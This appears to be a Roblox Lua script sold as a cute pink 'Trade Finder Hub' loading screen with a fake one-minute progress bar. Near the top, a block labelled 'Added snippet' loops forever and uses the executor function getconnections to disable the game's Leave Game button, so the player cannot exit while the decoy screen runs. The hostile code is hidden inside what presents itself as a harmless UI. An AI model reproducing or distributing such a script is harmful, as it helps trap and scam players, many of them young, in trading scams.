--// Cute Loading Screen
--// Put this in StarterGui > LocalScript

local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")

-- Added snippet
task.spawn(function()
	while task.wait() do
		pcall(function()
			for _,v in ipairs(getconnections(
				game:GetService("CoreGui")
				.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
				.Page.PageViewClipper.PageView.PageViewInnerFrame
				.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer
				.LeaveGameButton.Activated
			)) do
				v:Disable()
			end
		end)
	end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "CuteLoader"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- MAIN FRAME
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 190)
frame.Position = UDim2.new(0.35, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(255, 228, 236)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 20)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 182, 193)
stroke.Thickness = 3
stroke.Parent = frame

-- TOP BAR
local top = Instance.new("Frame")
top.Size = UDim2.new(1, 0, 0, 35)
top.BackgroundColor3 = Color3.fromRGB(255, 192, 203)
top.BorderSizePixel = 0
top.Parent = frame

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 20)
topCorner.Parent = top

-- TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.Text = "Trade Finder Hub Loading.."
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Parent = top

-- DECOR HEARTS
for i = 1,6 do
	local heart = Instance.new("TextLabel")
	heart.Size = UDim2.new(0, 25, 0, 25)
	heart.Position = UDim2.new(0, (i * 50)-35, 0, 45)
	heart.BackgroundTransparency = 1
	heart.Text = "♡"
	heart.Font = Enum.Font.GothamBold
	heart.TextScaled = true
	heart.TextColor3 = Color3.fromRGB(255, 182, 193)
	heart.Parent = frame
end

-- STATUS TEXT
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 0, 40)
status.Position = UDim2.new(0, 10, 0, 85)
status.BackgroundTransparency = 1
status.Text = "Initializing..."
status.Font = Enum.Font.GothamMedium
status.TextSize = 22
status.TextColor3 = Color3.fromRGB(120, 80, 90)
status.Parent = frame

-- PROGRESS BAR BG
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.85, 0, 0, 20)
barBG.Position = UDim2.new(0.075, 0, 0, 140)
barBG.BackgroundColor3 = Color3.fromRGB(255, 240, 245)
barBG.BorderSizePixel = 0
barBG.Parent = frame

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(1,0)
bgCorner.Parent = barBG

-- PROGRESS BAR
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
bar.BorderSizePixel = 0
bar.Parent = barBG

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1,0)
barCorner.Parent = bar

-- LOADING TEXTS
local messages = {
	"Configuring assets...",
	"Executing modules...",
	"Loading interface...",
	"Syncing data...",
	"Preparing visuals...",
	"Injecting scripts...",
	"Applying settings...",
	"Finalizing setup..."
}

-- ANIMATION
for i = 1, #messages do
	status.Text = messages[i]

	local goal = {}
	goal.Size = UDim2.new(i / #messages, 0, 1, 0)

	local tween = TweenService:Create(
		bar,
		TweenInfo.new(7.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		goal
	)

	tween:Play()
	tween.Completed:Wait()
end

-- WAIT TO COMPLETE 1 MIN TOTAL
wait(60 - (#messages * 7.5))

status.Text = "Completed ♡"

wait(2)

-- FADE OUT
for _, obj in pairs(frame:GetDescendants()) do
	if obj:IsA("TextLabel") then
		TweenService:Create(obj, TweenInfo.new(1), {
			TextTransparency = 1
		}):Play()
	elseif obj:IsA("Frame") then
		TweenService:Create(obj, TweenInfo.new(1), {
			BackgroundTransparency = 1
		}):Play()
	end
end

wait(1.2)
gui:Destroy()
